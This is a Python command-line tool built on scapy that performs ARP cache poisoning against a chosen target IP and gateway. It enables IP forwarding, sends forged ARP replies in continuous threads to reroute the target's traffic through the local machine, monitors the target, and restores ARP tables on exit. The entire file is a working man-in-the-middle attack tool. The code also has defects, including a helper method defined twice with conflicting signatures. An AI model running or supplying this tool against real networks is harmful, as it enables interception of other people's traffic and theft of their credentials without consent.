#!/usr/bin/python3


import threading
import subprocess
import time
import os
import netifaces  # For network interface information
import errno
from scapy.all import *
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.text import Text


class Rerouter:
    def __init__(self, target_ip, gateway_ip=None, interface=None, verbose=True):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or self._get_default_gateway()
        self.interface = interface or conf.iface  # Use scapy's default if none provided
        self.target_mac = None
        self.gateway_mac = None
        self.verbose = verbose
        self.poison_threads = []
        self.stop_event = threading.Event()
        self.heartbeat_thread = None
        self.console = Console()
        self.max_retries = 3  # Maximum retries for heartbeat failures
        self.retry_delay = 5  # Delay between retries in seconds
        self.failed = False  # Flag to indicate if rerouting has failed

        # Automatically determine gateway and interface if not provided
        self.interface = interface or self._get_default_interface()

        if (
            not self.interface
        ):  # Handle the case where no default interface can be found
            self._print_error("No valid network interface found. Exiting.")
            return  # Or raise an exception if that's more appropriate

        self.gateway_ip = gateway_ip or self._get_default_gateway(self.interface)

        if not self.gateway_ip:  # Handle potential error from _get_default_gateway
            self._print_error("Could not determine default gateway. Exiting.")
            return

        self.target_mac = None
        self.gateway_mac = None
        self.poison_threads = []
        self.heartbeat_thread = None

        # Rich table setup (using dictionary for easier updates)
        self.table_data = {
            "Target IP": f"[bold blue]{self.target_ip}[/]",
            "Gateway IP": f"[bold blue]{self.gateway_ip}[/]",
            "Target MAC": "[bold yellow]Resolving...[/]",
            "Gateway MAC": "[bold yellow]Resolving...[/]",
            "Status": "[bold yellow]Initializing...[/]",
            "IP Forwarding": "[bold yellow]Enabling...[/]",
        }
        self.live_table = Table(title="Rerouter Status", show_lines=True)
        for key, value in self.table_data.items():
            self.live_table.add_row(key, value)

    def _get_default_interface(self):
        """Gets the default network interface using netifaces."""
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][1]  # Returns interface name
        except (KeyError, IndexError):
            self._print_error("Error getting default interface")
            return None

    def _get_default_gateway(self, interface):
        """Gets the default gateway for the specified interface."""
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][0]
        except (KeyError, IndexError):
            self._print_error("Error getting default gateway")
            return None

    def _print_status(self, message):
        if self.verbose:
            self.console.print(f"[bold green][+][/] {message}")

    def _print_error(self, message):
        if self.verbose:
            self.console.print(f"[bold red][!][/] {message}")

    def _update_table(self, key, value):
        for row in self.live_table.rows:
            if row.cells[0].plain == key:
                row.cells[1] = Text(value)
                break  # Row updated, exit loop

    def _poison_target(self):
        try:
            while not self.stop_event.is_set():
                packet = ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip,
                )
                send(packet, verbose=0, iface=self.interface)
                time.sleep(2)
        except OSError as ose:
            self._print_error(f"Error in _poison_target: {ose}")
            self._update_table("Status", f"[bold red]Error: {ose}[/]")
            self.failed = True  # Set failed flag
            self.stop_event.set()  # Stop other threads
            raise  # Re-raise to be handled in start()

    def _poison_gateway(self):
        try:
            while not self.stop_event.is_set():
                packet = ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip,
                )
                send(packet, verbose=0, iface=self.interface)
                time.sleep(2)
        except OSError as ose:
            self._print_error(f"Error in _poison_gateway: {ose}")
            self._update_table("Status", f"[bold red]Error: {ose}[/]")
            self.failed = True
            self.stop_event.set()
            raise  # Re-raise to be handled in start()

    def _heartbeat(self):
        retries = 0
        while not self.stop_event.is_set():
            try:
                response = srp1(
                    Ether(dst=self.target_mac) / ARP(pdst=self.target_ip),
                    timeout=1,
                    verbose=0,
                    iface=self.interface,
                )
                if response and response.haslayer(ARP):
                    if response[ARP].hwsrc != self.target_mac:
                        self._print_error("Target MAC changed. Restarting...")
                        self.restore()
                        self.start()  # Restart the whole process
                        return  # Exit heartbeat thread after restart
                    retries = 0  # Reset retries on success
                else:
                    self._print_error("Target unreachable. Retrying...")
                    retries += 1
                    if retries >= self.max_retries:
                        self._print_error("Max retries reached. Stopping.")
                        self.failed = True
                        self.stop_event.set()  # Stop poisoning
                        break  # Exit the heartbeat loop after max retries

            except OSError as ose:
                self._print_error(f"Heartbeat check failed: {ose}")
                self._update_table("Status", f"[bold red]Error: {ose}[/]")
                self.failed = True
                self.stop_event.set()  # Stop other threads
                break  # Heartbeat thread will end if stop_event is set
            time.sleep(self.retry_delay)

    def _get_default_gateway(self):
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][0]
        except (KeyError, IndexError):
            self._print_error("Could not determine default gateway.")
            return None

    def _get_mac(self, ip_address):

        retries = 0
        while retries < self.max_retries:  # Retry loop
            try:
                ans, _ = srp(
                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                    timeout=2,
                    verbose=0,
                    iface=self.interface,
                )
                if ans:
                    return ans[0][1].hwsrc
                else:
                    self._print_error(f"No ARP response from {ip_address}. Retrying...")
                    retries += 1
                    time.sleep(self.retry_delay)
            except OSError as ose:  # Handle socket errors
                self._print_error(f"Error getting MAC of {ip_address}: {ose}")
                retries += 1
                time.sleep(self.retry_delay)

        return None  # Return None if MAC address cannot be found after retries

    def _enable_ip_forwarding(self):
        try:
            subprocess.check_call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
            self._update_table("IP Forwarding", "[bold green]Enabled[/]")
        except subprocess.CalledProcessError:
            self._print_error("Failed to enable IP forwarding.")

    def _disable_ip_forwarding(self):
        try:
            subprocess.check_call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
            self._update_table(
                "IP Forwarding", "[bold red]Disabled[/]"
            )  # Update Rich table
        except subprocess.CalledProcessError:
            self._print_error("Failed to disable IP forwarding.")

    def _restore(self):
        if self.target_mac and self.gateway_mac:  # Check if MACs were resolved
            try:
                send(
                    ARP(
                        op=2,
                        pdst=self.gateway_ip,
                        hwdst=self.gateway_mac,
                        psrc=self.target_ip,
                        hwsrc=self.target_mac,
                    ),
                    count=5,
                    verbose=0,
                    iface=self.interface,
                )
                send(
                    ARP(
                        op=2,
                        pdst=self.target_ip,
                        hwdst=self.target_mac,
                        psrc=self.gateway_ip,
                        hwsrc=self.gateway_mac,
                    ),
                    count=5,
                    verbose=0,
                    iface=self.interface,
                )
            except OSError as ose:
                self._print_error(
                    f"Error restoring ARP: {ose}"
                )  # Correctly log the error

    def restore(self):

        self.stop_event.set()

        for thread in self.poison_threads:
            if thread:
                thread.join()  # Make sure the threads actually exit

        self.poison_threads = []  # Clear the thread list

        restore_thread = threading.Thread(target=self._restore, daemon=True)
        restore_thread.start()
        restore_thread.join()  # Wait for restore to complete

        if self.heartbeat_thread:
            self.heartbeat_thread.join()

        self._disable_ip_forwarding()  #  Put IP forwarding reset here to restore even if the threads have failed
        self._update_table(
            "Status", "[bold yellow]ARP Table Restored[/]"
        )  # ARP Table restored after poisoning thread ends

        if self.failed:
            self._print_error(f"Rerouting failed due to previous error.")
        else:
            self._print_status("Rerouting stopped and ARP entries restored.")

    def start(self):
        with Live(self.live_table, refresh_per_second=4):  # Use "with Live(...)"
            self._update_table(
                "Status", "[bold yellow]Resolving MACs...[/]"
            )  # Status is updated as the program is running
            self._enable_ip_forwarding()

            self.target_mac = self._get_mac(self.target_ip)
            self.gateway_mac = self._get_mac(self.gateway_ip)

            self._update_table(
                "Target MAC", f"[bold green]{self.target_mac}[/]"
            )  # Update Target MAC
            self._update_table(
                "Gateway MAC", f"[bold green]{self.gateway_mac}[/]"
            )  # Update Gateway MAC

            if not self.target_mac or not self.gateway_mac:
                self._print_error("Failed to resolve MAC addresses. Exiting.")
                self._update_table(
                    "Status", "[bold red]Failed: MAC Resolution[/]"
                )  # Update Rich table status
                self._disable_ip_forwarding()  # Disable IP forwarding on failure
                return

            poison_target_thread = threading.Thread(
                target=self._poison_target, daemon=True
            )
            poison_gateway_thread = threading.Thread(
                target=self._poison_gateway, daemon=True
            )

            self.poison_threads = [
                poison_target_thread,
                poison_gateway_thread,
            ]  # Keep track of threads

            poison_target_thread.start()
            poison_gateway_thread.start()

            self._update_table("Status", "[bold green]Active (Poisoning ARP)[/]")
            self._print_status(f"Traffic from {self.target_ip} is now being rerouted!")

            self.heartbeat_thread = threading.Thread(
                target=self._heartbeat, daemon=True
            )
            self.heartbeat_thread.start()

            # Keep the main thread alive to handle exceptions from other threads and to respond to stop signals
            try:
                while True:
                    if self.failed or self.stop_event.is_set():
                        self.stop()
                        break
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop()

    def stop(self):  # stop method for console use and from within a program

        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.stop_event.set()  # Use the stop_event here
            self.heartbeat_thread.join()

        self.restore()

        if self.failed:  # Exit with an error code if failed
            exit(1)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Reroute traffic from a target IP.")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("gateway_ip", nargs="?", help="Gateway IP address (optional)")
    parser.add_argument("-i", "--interface", help="Network interface (optional)")
    args = parser.parse_args()

    rerouter = Rerouter(args.target_ip, args.gateway_ip, args.interface)
    try:
        rerouter.start()

    except KeyboardInterrupt:
        print("Stopping...")
        rerouter.stop()
    except Exception as e:
        print(f"An unexpected error occurred: {e}")  # Handle all exceptions
        rerouter.stop()
